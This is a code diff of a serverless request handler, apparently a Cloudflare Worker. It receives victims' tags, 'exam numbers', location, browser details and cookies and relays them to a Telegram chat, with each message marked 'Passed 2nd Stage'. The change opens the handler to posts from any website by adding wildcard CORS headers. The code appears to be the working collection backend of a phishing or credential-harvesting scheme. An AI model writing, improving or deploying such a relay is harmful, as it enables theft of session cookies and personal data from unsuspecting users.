@@ -1,29 +1,38 @@
 export default {
   async fetch(request, env) {
-    // Allow only POST requests
-    if (request.method !== 'POST') {
-      return new Response('Only POST allowed', { status: 405 });
+    const corsHeaders = {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type",
+    };
+
+    // Handle preflight requests (browser CORS checks)
+    if (request.method === "OPTIONS") {
+      return new Response(null, { headers: corsHeaders });
     }
 
-    // Parse JSON body
+    if (request.method !== "POST") {
+      return new Response('Only POST allowed', { status: 405, headers: corsHeaders });
+    }
+
     let data;
     try {
       data = await request.json();
     } catch {
-      return new Response('Invalid JSON', { status: 400 });
+      return new Response('Invalid JSON', { status: 400, headers: corsHeaders });
     }
 
     const { userTag, examNumber, geoInfo, browserInfo, cookies } = data;
 
     if (!userTag || !examNumber) {
-      return new Response('Missing userTag or examNumber', { status: 400 });
+      return new Response('Missing userTag or examNumber', { status: 400, headers: corsHeaders });
     }
 
     const BOT_TOKEN = env.BOT_TOKEN;
     const CHAT_ID = env.CHAT_ID;
 
     if (!BOT_TOKEN || !CHAT_ID) {
-      return new Response('Environment variables not set', { status: 500 });
+      return new Response('Environment variables not set', { status: 500, headers: corsHeaders });
     }
 
     const message =
@@ -31,9 +40,7 @@ export default {
       `🏷️ Tag: ${userTag}\n` +
       `📨 Exam Number: ${examNumber}\n` +
       `🌍 Country: ${geoInfo?.country || 'Unknown'}\n` +
-      `📍 Address: ${geoInfo?.address || 'Unknown'}\n` +
-      `⏰ Timezone: ${geoInfo?.timezone || 'Unknown'}\n` +
-      `🖥️ Browser: ${browserInfo?.name || 'Unknown'} v${browserInfo?.version || ''}\n` +
+      `🖥️ Browser: ${browserInfo?.name || 'Unknown'}\n` +
       `🍪 Cookies: ${cookies || 'None'}\n` +
       `✔️ Passed 2nd Stage`;
 
@@ -56,7 +63,7 @@ export default {
       if (telegramData.ok) {
         return new Response(JSON.stringify({ success: true }), {
           status: 200,
-          headers: { 'Content-Type': 'application/json' },
+          headers: { ...corsHeaders, "Content-Type": "application/json" },
         });
       } else {
         return new Response(JSON.stringify({
@@ -64,7 +71,7 @@ export default {
           details: telegramData
         }), {
           status: 502,
-          headers: { 'Content-Type': 'application/json' },
+          headers: { ...corsHeaders, "Content-Type": "application/json" },
         });
       }
     } catch (err) {
@@ -73,8 +80,8 @@ export default {
         details: err.message
       }), {
         status: 502,
-        headers: { 'Content-Type': 'application/json' },
+        headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
     }
-  },
+  }
 };
